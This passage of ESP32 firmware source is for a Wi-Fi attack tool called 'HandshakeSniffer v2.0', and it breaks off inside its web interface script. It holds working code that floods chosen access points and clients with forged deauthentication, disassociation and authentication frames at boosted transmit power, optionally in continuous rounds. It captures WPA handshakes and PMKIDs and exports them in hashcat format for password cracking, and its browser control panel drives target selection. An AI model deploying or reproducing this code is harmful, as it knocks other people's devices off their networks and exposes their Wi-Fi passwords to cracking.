  setLed(LS_GREEN);

  int total_crackable = 0;
  if (g_hsMutex && xSemaphoreTake(g_hsMutex, pdMS_TO_TICKS(200)) == pdTRUE) {
    for (int i = 0; i < MAX_SESSIONS; i++) {
      if (g_sessions[i].active &&
          ((g_sessions[i].m1 && g_sessions[i].m2) || g_sessions[i].pmkid))
        total_crackable++;
    }
    xSemaphoreGive(g_hsMutex);
  }
  logEvent("Capture stopped. Bytes=%u Sessions=%d Crackable=%d",
           (unsigned)g_capLen, g_sessionCount, total_crackable);
}

// ─── DEAUTH TASK ─────────────────────────────────────────────────────────────
void deauth_task(void* param) {
  char bstr[18]; mac2str(g_targetBSSID, bstr);
  char cbstr[18] = "broadcast";
  if (!macZero(g_deauthClientMAC)) mac2str(g_deauthClientMAC, cbstr);
  logEvent("Deauth: AP=%s CLI=%s ch%d x%d reason=%d",
           bstr, cbstr, g_targetChannel, g_deauthBursts, g_deauthReason);
  setLed(LS_RED);

  bool wasCapturing = g_capActive;
  bool wasRunning   = g_promiscRunning;
  uint32_t gap_us   = kGaps[g_deauthGapIdx < 3 ? g_deauthGapIdx : 1];

  do {
    if (wasRunning) {
      g_promiscPaused = true;
      esp_wifi_set_promiscuous_rx_cb(NULL);
      esp_wifi_set_promiscuous(false);
      vTaskDelay(pdMS_TO_TICKS(5));
    }

    // Boost TX power for deauth burst
    esp_wifi_set_max_tx_power(MAX_TX_POWER);

    const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    uint8_t reason_lo = g_deauthReason;
    uint8_t reason_hi = 0x00;

    // Deauth to broadcast
    uint8_t frame_bc[26] = {};
    frame_bc[0] = 0xC0; frame_bc[1] = 0x00;
    frame_bc[2] = 0x3A; frame_bc[3] = 0x01;
    memcpy(frame_bc +  4, bcast,         6);
    memcpy(frame_bc + 10, g_targetBSSID, 6);
    memcpy(frame_bc + 16, g_targetBSSID, 6);
    frame_bc[24] = reason_lo; frame_bc[25] = reason_hi;

    // Deauth unicast to specific client (if set)
    uint8_t frame_uc[26] = {};
    bool has_unicast = !macZero(g_deauthClientMAC);
    if (has_unicast) {
      memcpy(frame_uc, frame_bc, 26);
      memcpy(frame_uc + 4, g_deauthClientMAC, 6);
    }

    // Disassoc broadcast
    uint8_t disassoc[26];
    memcpy(disassoc, frame_bc, 26);
    disassoc[0]  = 0xA0;
    disassoc[24] = 0x08;

    // Disassoc unicast
    uint8_t disassoc_uc[26];
    if (has_unicast) {
      memcpy(disassoc_uc, disassoc, 26);
      memcpy(disassoc_uc + 4, g_deauthClientMAC, 6);
    }

    // Auth flood (forces fresh EAPOL exchange)
    uint8_t auth[30] = {};
    auth[0] = 0xB0; auth[1] = 0x00;
    auth[2] = 0x3A; auth[3] = 0x01;
    memcpy(auth +  4, bcast,         6);
    memcpy(auth + 10, g_targetBSSID, 6);
    memcpy(auth + 16, g_targetBSSID, 6);
    auth[24] = 0x00; auth[25] = 0x00;
    auth[26] = 0x01; auth[27] = 0x00;
    auth[28] = 0x00; auth[29] = 0x00;

    for (int burst = 0; burst < g_deauthBursts && g_deauthRunning; burst++) {
      // Re-set channel every burst — handles band-steering APs
      esp_wifi_set_channel(g_targetChannel, WIFI_SECOND_CHAN_NONE);

      for (int i = 0; i < 10; i++) {
        esp_wifi_80211_tx(WIFI_IF_AP,  frame_bc,   26, true);
        esp_wifi_80211_tx(WIFI_IF_STA, frame_bc,   26, true);
        if (has_unicast) {
          esp_wifi_80211_tx(WIFI_IF_AP,  frame_uc, 26, true);
          esp_wifi_80211_tx(WIFI_IF_STA, frame_uc, 26, true);
        }
        esp_wifi_80211_tx(WIFI_IF_AP,  disassoc,   26, true);
        esp_wifi_80211_tx(WIFI_IF_STA, disassoc,   26, true);
        if (has_unicast) {
          esp_wifi_80211_tx(WIFI_IF_AP,  disassoc_uc, 26, true);
          esp_wifi_80211_tx(WIFI_IF_STA, disassoc_uc, 26, true);
        }
        esp_wifi_80211_tx(WIFI_IF_AP,  auth,       30, true);
        esp_wifi_80211_tx(WIFI_IF_STA, auth,       30, true);
        ets_delay_us(gap_us);
      }
      vTaskDelay(pdMS_TO_TICKS(80));
    }

    // Restore promisc immediately after burst so capture resumes fast
    if (wasRunning) {
      esp_wifi_set_channel(g_targetChannel, WIFI_SECOND_CHAN_NONE);
      vTaskDelay(pdMS_TO_TICKS(5));
      esp_wifi_set_promiscuous(true);
      esp_wifi_set_promiscuous_rx_cb(promisc_cb);
      g_promiscPaused = false;
    } else {
      esp_wifi_set_channel(AP_CHANNEL, WIFI_SECOND_CHAN_NONE);
    }

    logEvent("Deauth burst done — listening for EAPOL...");

    if (g_deauthCont && g_deauthRunning) {
      // Wait interval before next round
      uint32_t waited = 0;
      while (waited < g_deauthInterval && g_deauthRunning) {
        vTaskDelay(pdMS_TO_TICKS(200));
        waited += 200;
      }
    }

  } while (g_deauthCont && g_deauthRunning);

  g_deauthRunning = false;
  g_deauthTask    = NULL;
  setLed(wasCapturing ? LS_CYAN : LS_GREEN);
  vTaskDelete(NULL);
}

// ─── SCAN TASK ───────────────────────────────────────────────────────────────
void scan_task(void* param) {
  bool wasCapturing = g_capActive;
  int  savedChannel = g_targetChannel;

  if (wasCapturing) {
    g_capActive     = false;
    g_promiscPaused = true;
    esp_wifi_set_promiscuous_rx_cb(NULL);
    esp_wifi_set_promiscuous(false);
    vTaskDelay(pdMS_TO_TICKS(50));
  }

  int n = WiFi.scanNetworks(false, true, false, 300);

  // FIX: scanDelete before restoring promisc (v1.4 had race here)
  WiFi.scanDelete();

  int restoreChannel = wasCapturing ? savedChannel : AP_CHANNEL;
  esp_wifi_set_channel(restoreChannel, WIFI_SECOND_CHAN_NONE);
  vTaskDelay(pdMS_TO_TICKS(20));

  if (wasCapturing) {
    g_capActive     = true;
    g_promiscPaused = false;
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(promisc_cb);
  }

  // Pass 1: populate g_aps[] under mutex
  int localCount = 0;
  if (n > 0 && g_scanMutex && xSemaphoreTake(g_scanMutex, pdMS_TO_TICKS(500)) == pdTRUE) {
    g_apCount = (n > SCAN_MAX_APS) ? SCAN_MAX_APS : n;
    localCount = g_apCount;
    for (int i = 0; i < g_apCount; i++) {
      uint8_t* bssid = WiFi.BSSID(i);
      if (!bssid) { g_apCount--; i--; continue; }
      strncpy(g_aps[i].ssid, WiFi.SSID(i).c_str(), 32);
      g_aps[i].ssid[32] = '\0';
      memcpy(g_aps[i].bssid, bssid, 6);
      g_aps[i].rssi    = WiFi.RSSI(i);
      g_aps[i].channel = WiFi.channel(i);
      g_aps[i].enc     = (int)WiFi.encryptionType(i);
    }
    localCount = g_apCount;
    xSemaphoreGive(g_scanMutex);
  }

  // Pass 2: build HTML without mutex
  String html = "";
  if (n <= 0 || localCount == 0) {
    html = "<tr><td colspan='7' style='text-align:center;color:#888;padding:20px'>No networks found</td></tr>";
  } else {
    for (int i = 0; i < localCount; i++) {
      char bstr[18];
      mac2str(g_aps[i].bssid, bstr);
      int  rssi = g_aps[i].rssi;
      int  ch   = g_aps[i].channel;

      const char* enc;
      switch (g_aps[i].enc) {
        case WIFI_AUTH_OPEN:            enc = "Open";    break;
        case WIFI_AUTH_WEP:             enc = "WEP";     break;
        case WIFI_AUTH_WPA_PSK:         enc = "WPA";     break;
        case WIFI_AUTH_WPA2_PSK:        enc = "WPA2";    break;
        case WIFI_AUTH_WPA_WPA2_PSK:    enc = "WPA/2";   break;
        case WIFI_AUTH_WPA2_ENTERPRISE: enc = "WPA2-E";  break;
        case WIFI_AUTH_WPA3_PSK:        enc = "WPA3";    break;
        case WIFI_AUTH_WPA2_WPA3_PSK:   enc = "WPA2/3";  break;
        case WIFI_AUTH_WAPI_PSK:        enc = "WAPI";    break;
        case WIFI_AUTH_OWE:             enc = "OWE";     break;
        default:                        enc = "WPA2";    break;
      }

      // RSSI bar (5 levels) and signal color
      int bars = rssi > -50 ? 5 : (rssi > -60 ? 4 : (rssi > -70 ? 3 : (rssi > -80 ? 2 : 1)));
      String barHtml = "";
      const char* barColors[] = {"#f85149","#da3633","#d29922","#3fb950","#2ea043"};
      for (int b = 1; b <= 5; b++) {
        int h = 4 + b * 3;
        barHtml += "<span style='display:inline-block;width:4px;height:" + String(h) + "px;margin-right:1px;border-radius:1px;background:"
                + String(b <= bars ? barColors[bars-1] : "#30363d") + ";vertical-align:bottom'></span>";
      }
      String col  = rssi > -50 ? "#3fb950" : (rssi > -70 ? "#d29922" : "#f85149");
      String disp = strlen(g_aps[i].ssid) ? String(g_aps[i].ssid) : "<i style='color:#888'>[Hidden]</i>";
      String ssidEsc = String(g_aps[i].ssid);
      ssidEsc.replace("\\", "\\\\");
      ssidEsc.replace("'",  "\\'");

      html += "<tr>"
        "<td>" + String(i+1) + "</td>"
        "<td>" + disp + "</td>"
        "<td class='mono'>" + String(bstr) + "</td>"
        "<td>" + ch + "</td>"
        "<td>" + barHtml + " <span style='color:" + col + ";font-size:0.75rem'>" + rssi + "</span></td>"
        "<td>" + enc + "</td>"
        "<td><button class='btn-sel' onclick=\"selectTarget('" + String(bstr) + "'," + ch + ",'" + ssidEsc + "')\">Select</button></td>"
        "</tr>";
    }
  }

  // Pass 3: store cache under mutex
  if (g_scanMutex && xSemaphoreTake(g_scanMutex, pdMS_TO_TICKS(500)) == pdTRUE) {
    g_scanCache = html;
    xSemaphoreGive(g_scanMutex);
  }
  __atomic_store_n((bool*)&g_scanBusy, false, __ATOMIC_SEQ_CST);
  logEvent("Scan done: %d APs", localCount);
  vTaskDelete(NULL);
}

// ─── HASHCAT 22000 BUILDER ────────────────────────────────────────────────────
// Returns all crackable sessions — not just the first one.
String build22000() {
  if (xSemaphoreTake(g_hsMutex, SEM_TIMEOUT) != pdTRUE) return "";
  HsSession snap[MAX_SESSIONS];
  memcpy(snap, g_sessions, sizeof(snap));
  xSemaphoreGive(g_hsMutex);

  int  ssidLen = strnlen(g_targetSSID, 32);
  char ssidHexBuf[65];
  bytesToHex((const uint8_t*)g_targetSSID, ssidLen, ssidHexBuf);

  String out = "";

  for (int idx = 0; idx < MAX_SESSIONS; idx++) {
    const HsSession& hs = snap[idx];
    if (!hs.active) continue;
    if (macZero(hs.ap_mac)) continue;

    char ap[13], cli[13];
    snprintf(ap,  13, "%02x%02x%02x%02x%02x%02x",
      hs.ap_mac[0],hs.ap_mac[1],hs.ap_mac[2],
      hs.ap_mac[3],hs.ap_mac[4],hs.ap_mac[5]);
    snprintf(cli, 13, "%02x%02x%02x%02x%02x%02x",
      hs.cli_mac[0],hs.cli_mac[1],hs.cli_mac[2],
      hs.cli_mac[3],hs.cli_mac[4],hs.cli_mac[5]);

    char pmkidHexBuf[33], anonceHexBuf[65], micHexBuf[33];
    char micDataHexBuf[257], rsnieHexBuf[129];

    if (hs.pmkid) {
      bytesToHex(hs.pmkid_bytes, 16, pmkidHexBuf);
      out += "WPA*01*";
      out += pmkidHexBuf;
      out += "*"; out += ap;
      out += "*"; out += cli;
      out += "*"; out += ssidHexBuf;
      out += "***\n";
    }

    if (hs.m1 && hs.m2 && hs.mic_valid) {
      uint8_t mic_data_copy[128];
      memcpy(mic_data_copy, hs.mic_data, hs.mic_data_len);
      if (hs.mic_data_len > EAPOL_MIC_OFFSET + 16)
        memset(mic_data_copy + EAPOL_MIC_OFFSET, 0, 16);

      bytesToHex(hs.mic,        16,              micHexBuf);
      bytesToHex(hs.anonce,     32,              anonceHexBuf);
      bytesToHex(mic_data_copy, hs.mic_data_len, micDataHexBuf);
      bytesToHex(hs.rsnie,      hs.rsnie_len,    rsnieHexBuf);

      out += "WPA*02*";
      out += micHexBuf;
      out += "*"; out += ap;
      out += "*"; out += cli;
      out += "*"; out += ssidHexBuf;
      out += "*"; out += anonceHexBuf;
      out += "*"; out += micDataHexBuf;
      out += "*"; out += rsnieHexBuf;
      out += "*02\n";
    }
  }

  if (out.length() == 0) out = "# No crackable handshake yet\n";
  return out;
}

// ─── JSON METADATA ────────────────────────────────────────────────────────────
String buildJSON() {
  if (xSemaphoreTake(g_hsMutex, SEM_TIMEOUT) != pdTRUE) return "{}";
  HsSession snap[MAX_SESSIONS];
  int snapCount = g_sessionCount;
  memcpy(snap, g_sessions, sizeof(snap));
  xSemaphoreGive(g_hsMutex);

  size_t capBytes = 0;
  if (g_capMutex && xSemaphoreTake(g_capMutex, pdMS_TO_TICKS(200)) == pdTRUE) {
    capBytes = g_capLen;
    xSemaphoreGive(g_capMutex);
  }

  // JSON-escape SSID
  char ssidEsc[132] = "";
  {
    int o = 0;
    for (int i = 0; g_targetSSID[i] && i < 32 && o < 128; i++) {
      uint8_t c = (uint8_t)g_targetSSID[i];
      if      (c == '"')  { ssidEsc[o++] = '\\'; ssidEsc[o++] = '"';  }
      else if (c == '\\') { ssidEsc[o++] = '\\'; ssidEsc[o++] = '\\'; }
      else if (c < 0x20)  { ssidEsc[o++] = '?'; }
      else                { ssidEsc[o++] = (char)c; }
    }
    ssidEsc[o] = '\0';
  }

  String out = "{\"ssid\":\"";
  out += ssidEsc;
  out += "\",\"channel\":";
  out += g_targetChannel;
  out += ",\"cap_bytes\":";
  out += (unsigned)capBytes;
  out += ",\"cap_full\":";
  out += g_capFull ? "true" : "false";
  out += ",\"capturing\":";
  out += g_capActive ? "true" : "false";
  out += ",\"heap_free\":";
  out += (unsigned)ESP.getFreeHeap();
  out += ",\"psram_free\":";
  out += (unsigned)(psramFound() ? ESP.getFreePsram() : 0);
  out += ",\"sessions\":[";

  bool first = true;
  for (int i = 0; i < MAX_SESSIONS; i++) {
    const HsSession& s = snap[i];
    if (!s.active) continue;
    if (!first) out += ",";
    first = false;

    char ap[18], cli[18];
    mac2str(s.ap_mac,  ap);
    mac2str(s.cli_mac, cli);
    char pmkidHex[33] = "";
    if (s.pmkid) bytesToHex(s.pmkid_bytes, 16, pmkidHex);
    bool crackable = (s.m1 && s.m2 && s.mic_valid) || s.pmkid;

    char buf[256];
    snprintf(buf, sizeof(buf),
      "{\"ap\":\"%s\",\"cli\":\"%s\","
      "\"m1\":%s,\"m2\":%s,\"m3\":%s,\"m4\":%s,"
      "\"pmkid\":%s,\"pmkid_hex\":\"%s\","
      "\"mic_valid\":%s,\"crackable\":%s,"
      "\"first_seen\":%u,\"last_seen\":%u}",
      ap, cli,
      s.m1?"true":"false", s.m2?"true":"false",
      s.m3?"true":"false", s.m4?"true":"false",
      s.pmkid?"true":"false", pmkidHex,
      s.mic_valid?"true":"false", crackable?"true":"false",
      (unsigned)s.first_seen, (unsigned)s.last_seen);
    out += buf;
  }

  out += "]}";
  return out;
}

// ─── SPARKLINE JSON ───────────────────────────────────────────────────────────
String buildSparkJSON() {
  String out = "[";
  if (g_sparkMutex && xSemaphoreTake(g_sparkMutex, pdMS_TO_TICKS(50)) == pdTRUE) {
    for (int i = 0; i < SPARK_LEN; i++) {
      int idx = (g_sparkHead + i) % SPARK_LEN;
      if (i) out += ",";
      out += g_sparkline[idx];
    }
    xSemaphoreGive(g_sparkMutex);
  }
  out += "]";
  return out;
}

// ─── CLIENTS JSON ─────────────────────────────────────────────────────────────
String buildClientsJSON() {
  String out = "[";
  if (g_cliMutex && xSemaphoreTake(g_cliMutex, pdMS_TO_TICKS(200)) == pdTRUE) {
    bool first = true;
    uint32_t now = (uint32_t)(esp_timer_get_time() / 1000);
    for (int i = 0; i < MAX_CLIENTS; i++) {
      if (!g_clients[i].active) continue;
      // Expire clients not seen in 30s
      if (now - g_clients[i].last_seen > 30000) { g_clients[i].active = false; continue; }
      if (!first) out += ",";
      first = false;
      char m[18]; mac2str(g_clients[i].mac, m);
      char buf[96];
      snprintf(buf, sizeof(buf),
        "{\"mac\":\"%s\",\"rssi\":%d,\"frames\":%u,\"age\":%u}",
        m, (int)g_clients[i].rssi, (unsigned)g_clients[i].frame_count,
        (unsigned)((now - g_clients[i].last_seen) / 1000));
      out += buf;
    }
    xSemaphoreGive(g_cliMutex);
  }
  out += "]";
  return out;
}

// ─── WEB UI HTML ─────────────────────────────────────────────────────────────
static const char INDEX_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>HandshakeSniffer v2.0</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
:root{
  --bg:#0d1117;--bg2:#161b22;--bg3:#1c2128;--bg4:#21262d;
  --border:#30363d;--border2:#21262d;
  --text:#e6edf3;--text2:#c9d1d9;--muted:#8b949e;
  --blue:#58a6ff;--green:#3fb950;--red:#f85149;--yellow:#d29922;
  --blue-bg:#388bfd22;--blue-border:#388bfd55;
}
body.light{
  --bg:#f6f8fa;--bg2:#ffffff;--bg3:#f0f2f5;--bg4:#e6eaef;
  --border:#d0d7de;--border2:#d0d7de;
  --text:#24292f;--text2:#24292f;--muted:#57606a;
  --blue:#0969da;--green:#2da44e;--red:#cf222e;--yellow:#9a6700;
  --blue-bg:#ddf4ff;--blue-border:#54aeff88;
}
body{background:var(--bg);color:var(--text);font-family:'Segoe UI',Arial,sans-serif;min-height:100vh;-webkit-text-size-adjust:100%;transition:background .2s,color .2s}
header{background:var(--bg2);border-bottom:1px solid var(--border);padding:12px 16px;display:flex;align-items:center;justify-content:space-between;gap:10px;flex-wrap:wrap}
header h1{font-size:1.1rem;font-weight:600;color:var(--blue);white-space:nowrap}
header .sub{font-size:0.72rem;color:var(--muted);margin-top:2px}
.hdr-right{display:flex;gap:8px;align-items:center;flex-shrink:0;flex-wrap:wrap}
.badge{background:var(--blue-bg);color:var(--blue);border:1px solid var(--blue-border);border-radius:12px;padding:3px 12px;font-size:0.72rem;white-space:nowrap}
.heap-chip{background:var(--bg4);color:var(--muted);border:1px solid var(--border);border-radius:12px;padding:3px 10px;font-size:0.7rem;white-space:nowrap;font-family:monospace}
.theme-btn{background:none;border:1px solid var(--border);color:var(--muted);border-radius:8px;padding:4px 9px;font-size:0.8rem;cursor:pointer;min-height:28px}
main{max-width:1060px;margin:0 auto;padding:14px 10px}
.card{background:var(--bg2);border:1px solid var(--border);border-radius:8px;margin-bottom:14px;overflow:hidden}
.card-head{padding:10px 14px;background:var(--bg3);border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;gap:8px;flex-wrap:wrap}
.card-head h2{font-size:0.92rem;font-weight:600;color:var(--text2)}
.card-body{padding:12px 14px}
button{border:none;border-radius:6px;padding:8px 14px;font-size:0.82rem;cursor:pointer;font-weight:500;transition:opacity .15s;min-height:36px;touch-action:manipulation;-webkit-tap-highlight-color:transparent}
button:hover{opacity:.85}button:active{opacity:.7}button:disabled{opacity:.4;cursor:default}
.btn-primary{background:#238636;color:#fff}
.btn-danger{background:#da3633;color:#fff}
.btn-warn{background:#9e6a03;color:#fff}
.btn-sel{background:#0d419d;color:#fff;padding:5px 11px;font-size:0.75rem;min-height:32px}
.btn-dl{background:#1f6feb;color:#fff}
.btn-sm{padding:5px 11px;font-size:0.75rem;min-height:32px;background:var(--bg4);color:var(--text2);border:1px solid var(--border)}
.btn-deauth-cli{background:#9e6a03;color:#fff;padding:4px 9px;font-size:0.72rem;min-height:28px}
.row{display:flex;gap:7px;flex-wrap:wrap;align-items:center}
.tbl-scroll{overflow-x:auto;-webkit-overflow-scrolling:touch;max-height:340px;overflow-y:auto}
.tbl-scroll::-webkit-scrollbar{height:4px;width:4px}
.tbl-scroll::-webkit-scrollbar-track{background:var(--bg)}
.tbl-scroll::-webkit-scrollbar-thumb{background:var(--border);border-radius:2px}
table{width:100%;min-width:520px;border-collapse:collapse;font-size:0.82rem}
thead{position:sticky;top:0;z-index:1}
th{background:var(--bg);color:var(--muted);font-weight:500;text-align:left;padding:8px 10px;border-bottom:1px solid var(--border);white-space:nowrap}
td{padding:7px 10px;border-bottom:1px solid var(--border2);vertical-align:middle;white-space:nowrap}
tr:last-child td{border-bottom:none}
tr:hover td{background:var(--bg3)}
td:nth-child(2){white-space:normal;word-break:break-all;min-width:80px}
.status-box{background:var(--bg);border:1px solid var(--border);border-radius:6px;padding:10px 12px;font-size:0.82rem}
.s-row{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:6px}
.s-kv{display:flex;flex-direction:column;min-width:72px}
.s-k{font-size:0.68rem;color:var(--muted);margin-bottom:2px;white-space:nowrap}
.s-v{font-size:0.88rem;font-weight:600}
.ok{color:var(--green)}.warn{color:var(--yellow)}.bad{color:var(--red)}.na{color:var(--muted)}
.log-box{background:var(--bg);border:1px solid var(--border2);border-radius:6px;padding:8px 10px;
  height:130px;overflow-y:auto;font-family:monospace;font-size:0.76rem;color:var(--muted);
  -webkit-overflow-scrolling:touch}
.log-box p{padding:1px 0;border-bottom:1px solid #21262d22;word-break:break-all}
.log-box p:last-child{border:none}
.ts{color:var(--blue);margin-right:6px}
.target-info{background:var(--bg3);border:1px solid var(--border);border-radius:6px;padding:8px 12px;font-size:0.82rem;color:var(--text2);word-break:break-all}
.mono{font-family:monospace;font-size:0.76rem}
.chip{display:inline-block;border-radius:10px;padding:1px 8px;font-size:0.72rem;font-weight:600;margin-left:3px}
.chip-yes{background:#238636;color:#fff}
.chip-no{background:var(--bg4);color:var(--muted)}
.chip-pmkid{background:#6e40c9;color:#fff}
.chip-crack{background:#da3633;color:#fff}
select{background:var(--bg);color:var(--text2);border:1px solid var(--border);border-radius:4px;padding:4px 6px;font-size:0.78rem;min-height:32px;touch-action:manipulation}
input[type=checkbox]{width:16px;height:16px;cursor:pointer;accent-color:var(--blue)}
.spark-wrap{padding:8px 14px 4px;border-top:1px solid var(--border)}
canvas{display:block;border-radius:4px}
.sess-table{width:100%;border-collapse:collapse;font-size:0.8rem}
.sess-table th{background:var(--bg);color:var(--muted);font-weight:500;text-align:left;padding:6px 8px;border-bottom:1px solid var(--border);white-space:nowrap}
.sess-table td{padding:6px 8px;border-bottom:1px solid var(--border2);vertical-align:middle;white-space:nowrap}
.sess-table tr:last-child td{border-bottom:none}
.cli-table{width:100%;border-collapse:collapse;font-size:0.8rem}
.cli-table th{background:var(--bg);color:var(--muted);font-weight:500;text-align:left;padding:6px 8px;border-bottom:1px solid var(--border)}
.cli-table td{padding:6px 8px;border-bottom:1px solid var(--border2);vertical-align:middle}
@media(max-width:600px){main{padding:10px 8px}.card-body{padding:10px 10px}.s-row{gap:8px}.s-kv{min-width:58px}.row{gap:6px}button{font-size:0.78rem}header h1{font-size:1rem}}
@media(max-width:380px){table{font-size:0.76rem}th,td{padding:6px 7px}}
</style>
</head>
<body>
<header>
  <div>
    <h1>🦈 HandshakeSniffer v2.0</h1>
    <div class="sub">ESP32-S3 · WPA/WPA2/WPA3 · Multi-client · EAPOL+PMKID</div>
  </div>
  <div class="hdr-right">
    <span class="heap-chip" id="heapChip">heap …</span>
    <span class="badge" id="capBadge">IDLE</span>
    <button class="theme-btn" onclick="toggleTheme()" title="Toggle dark/light">🌙</button>
  </div>
</header>
<main>

<!-- TARGET + CONTROLS -->
<div class="card">
  <div class="card-head">
    <h2>Target &amp; Capture</h2>
    <button class="btn-primary btn-sm" onclick="triggerScan()">🔍 Scan APs</button>
  </div>
  <div class="card-body">
    <div class="target-info" id="targetBox">
      <span style="color:var(--muted)">No target — scan below and click Select</span>
    </div>
    <div class="row" style="margin-top:10px">
      <button class="btn-primary" id="btnStart"  onclick="startCapture()" disabled>▶ Start</button>
      <button class="btn-danger"  id="btnStop"   onclick="stopCapture()"  disabled>■ Stop</button>
      <button class="btn-warn"    id="btnDeauth" onclick="sendDeauth()"   disabled>⚡ Deauth</button>
      <button class="btn-sm" onclick="clearBuf()">🗑 Clear</button>
      <button class="btn-sm" onclick="resetSessions()">↺ Reset Sessions</button>
    </div>
    <div class="row" style="margin-top:8px;gap:12px;flex-wrap:wrap">
      <label style="font-size:0.78rem;color:var(--muted);display:flex;align-items:center;gap:4px">Bursts:
        <select id="burstSel">
          <option value="3">3</option><option value="5" selected>5</option>
          <option value="10">10</option><option value="20">20</option>
          <option value="30">30</option><option value="50">50</option>
        </select>
      </label>
      <label style="font-size:0.78rem;color:var(--muted);display:flex;align-items:center;gap:4px">Reason:
        <select id="reasonSel">
          <option value="7" selected>7 (Class3)</option>
          <option value="1">1 (Unspecified)</option>
          <option value="3">3 (Leaving)</option>
          <option value="8">8 (Disassoc)</option>
          <option value="15">15 (4-Way TO)</option>
        </select>
      </label>
      <label style="font-size:0.78rem;color:var(--muted);display:flex;align-items:center;gap:4px">Gap:
        <select id="gapSel">
          <option value="0">50µs</option>
          <option value="1" selected>100µs</option>
          <option value="2">200µs</option>
        </select>
      </label>
      <label style="display:flex;align-items:center;gap:5px;font-size:0.78rem;color:var(--muted);cursor:pointer">
        <input type="checkbox" id="filterChk" checked> Filter BSSID
      </label>
      <label style="display:flex;align-items:center;gap:5px;font-size:0.78rem;color:var(--muted);cursor:pointer">
        <input type="checkbox" id="contChk"> Continuous
      </label>
      <label style="font-size:0.78rem;color:var(--muted);display:flex;align-items:center;gap:4px" id="contIntervalLabel" style="display:none">Interval:
        <select id="contInterval">
          <option value="3000">3s</option>
          <option value="5000" selected>5s</option>
          <option value="10000">10s</option>
          <option value="20000">20s</option>
          <option value="30000">30s</option>
        </select>
      </label>
    </div>
  </div>
  <!-- Sparkline graph -->
  <div class="spark-wrap">
    <div style="font-size:0.68rem;color:var(--muted);margin-bottom:4px">Capture activity (2s intervals, last 2min)</div>
    <canvas id="sparkCanvas" height="48" style="width:100%;background:var(--bg);border-radius:4px"></canvas>
  </div>
</div>

<!-- SESSION TABLE -->
<div class="card">
  <div class="card-head">
    <h2>Handshake Sessions</h2>
    <span id="sessCount" style="font-size:0.75rem;color:var(--muted)"></span>
  </div>
  <div class="tbl-scroll">
    <table class="sess-table">
      <thead>
        <tr>
          <th>AP MAC</th><th>Client MAC</th>
          <th>M1</th><th>M2</th><th>M3</th><th>M4</th>
          <th>PMKID</th><th>MIC</th><th>Crackable</th>
          <th>Seen</th><th>Export</th>
        </tr>
      </thead>
      <tbody id="sessBody">
        <tr><td colspan="11" style="text-align:center;color:var(--muted);padding:18px">
          Start capture to see sessions
        </td></tr>
      </tbody>
    </table>
  </div>
</div>

<!-- CONNECTED CLIENTS -->
<div class="card">
  <div class="card-head">
    <h2>Connected Clients</h2>
    <span id="cliCount" style="font-size:0.75rem;color:var(--muted)"></span>
  </div>
  <div class="tbl-scroll">
    <table class="cli-table">
      <thead>
        <tr><th>Client MAC</th><th>RSSI</th><th>Frames</th><th>Last Seen</th><th>Deauth</th></tr>
      </thead>
      <tbody id="cliBody">
        <tr><td colspan="5" style="text-align:center;color:var(--muted);padding:14px">
          Clients appear once capture is active and target selected
        </td></tr>
      </tbody>
    </table>
  </div>
</div>

<!-- EXPORTS -->
<div class="card">
  <div class="card-head"><h2>Downloads</h2></div>
  <div class="card-body">
    <div class="row">
      <button class="btn-dl" onclick="download('/dl_pcap','handshake.pcap')">⬇ PCAP</button>
      <button class="btn-dl" onclick="download('/dl_22000','handshake.22000')">⬇ 22000 (hashcat)</button>
      <button class="btn-dl" onclick="download('/dl_json','capture.json')">⬇ JSON</button>
    </div>
  </div>
</div>

<!-- SCAN RESULTS -->
<div class="card">
  <div class="card-head">
    <h2>Nearby Networks</h2>
    <span id="scanStatus" style="font-size:0.75rem;color:var(--muted)"></span>
  </div>
  <div class="tbl-scroll">
    <table>
      <thead>
        <tr><th>#</th><th>SSID</th><th>BSSID</th><th>CH</th><th>Signal</th><th>ENC</th><th>Action</th></tr>
      </thead>
      <tbody id="scanBody">
        <tr><td colspan="7" style="text-align:center;color:var(--muted);padding:22px;white-space:normal">
          Tap <b>Scan APs</b> to discover nearby networks
        </td></tr>
      </tbody>
    </table>
  </div>
</div>

<!-- LOG -->
<div class="card">
  <div class="card-head">
    <h2>Event Log</h2>
    <button class="btn-sm" onclick="clearLog()">Clear</button>
  </div>
  <div class="card-body" style="padding:8px 10px">
    <div class="log-box" id="logBox"></div>
  </div>
</div>

</main>
<script>
'use strict';
let selBSSID='', selCH=0, selSSID='', capturing=false;
let deauthClientMAC='';

// ── Theme ──────────────────────────────────────────────────────────────────
function toggleTheme(){
  document.body.classList.toggle('light');
  try{localStorage.setItem('theme', document.body.classList.contains('light')?'light':'dark');}catch(e){}
  drawSpark(lastSpark);
}
try{if(localStorage.getItem('theme')==='light')document.body.classList.add('light');}catch(e){}

// ── Target select ──────────────────────────────────────────────────────────
function selectTarget(bssid, ch, ssid) {
  selBSSID=bssid; selCH=ch; selSSID=ssid||'';
  deauthClientMAC='';
  document.getElementById('targetBox').innerHTML =
    '<b>'+(ssid||'[Hidden]')+'</b>'
    +' &nbsp;<span class="mono" style="color:var(--muted)">'+bssid+'</span>'
    +' &nbsp;CH&nbsp;<b>'+ch+'</b>';
  document.getElementById('btnStart').disabled=false;
  document.getElementById('btnDeauth').disabled=false;
}

// ── Scan ───────────────────────────────────────────────────────────────────
function triggerScan() {
  document.getElementById('scanStatus').textContent='Scanning\u2026';
  document.getElementById('scanBody').innerHTML=
    '<tr><td colspan="7" style="text-align:center;color:var(--muted);padding:18px">Scanning\u2026</td></tr>';
  fetch('/scan_trigger').then(()=>pollScan()).catch(()=>pollScan());
}
function pollScan() {
  fetch('/scan').then(r=>r.text()).then(html=>{
    if(html==='SCANNING'){setTimeout(pollScan,1200);return;}
    document.getElementById('scanBody').innerHTML=html;
    document.getElementById('scanStatus').textContent='';
  }).catch(()=>setTimeout(pollScan,2000));
}

// ── Capture ────────────────────────────────────────────────────────────────
function startCapture() {
  if(!selBSSID){alert('Select a target first');return;}
  let filter=document.getElementById('filterChk').checked?1:0;
  fetch('/start_capture?bssid='+selBSSID+'&ch='+selCH+'&ssid='+encodeURIComponent(selSSID)+'&filter='+filter)
    .then(()=>{
